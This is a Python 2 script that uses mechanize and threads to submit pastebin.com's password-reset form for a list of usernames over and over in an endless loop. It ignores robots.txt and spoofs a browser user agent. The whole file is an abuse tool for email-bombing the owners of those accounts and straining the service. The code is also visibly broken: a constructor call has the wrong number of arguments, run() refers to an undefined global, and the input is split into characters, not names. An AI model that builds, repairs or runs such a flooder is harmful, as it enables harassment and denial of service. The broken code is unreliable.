import mechanize
import threading


############FUNCTION THAT CUT A FILES IN MANY PARTS######################
def chunkIt(seq, num):
  avg = len(seq) / float(num)
  out = []
  last = 0.0
  while last < len(seq):
    out.append(seq[int(last):int(last + avg)])
    last += avg
  return out
###########END OF FUNCTION THAT CUT A FILE IN MANY PARTS##################



####################Begining of class pastebin   ###########################
class pastebin(threading.Thread):

    def __init__(self, id, userpastebin):
        self.id = id
        self.users = userpastebin
        self.running = False
        threading.Thread.__init__(self)

    def create(self,x):
        while 1:
            try:
                br = mechanize.Browser()
                br.set_handle_robots(False)
                br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
                br.open('http://pastebin.com/passmailer')
                br.select_form(nr=1)
                br.form['user_name'] = x
                br.submit()
                print "Another message was sent!"
            except:
                print "error"

    def run(self):
        for user in users:
            while user.endswith("\n"):
                user = user[:-1]
            while user.endswith("\r"):
                user = user[:-1]
            user = user.lower()
            self.create(user)
####################END  of class pastebin   ###########################



##################       MENU         ##################################
userpastebin = raw_input("Pastebin list of usernames: ")
nbthread= input("Enter the number of threads working at the same time:\n=> ")
z = chunkIt(userpastebin, nbthread)
for i, i2 in enumerate(z):
    Mythread = pastebin(i,i2,userpastebin)
    Mythread.start()

################## END OF   MENU         ##################################
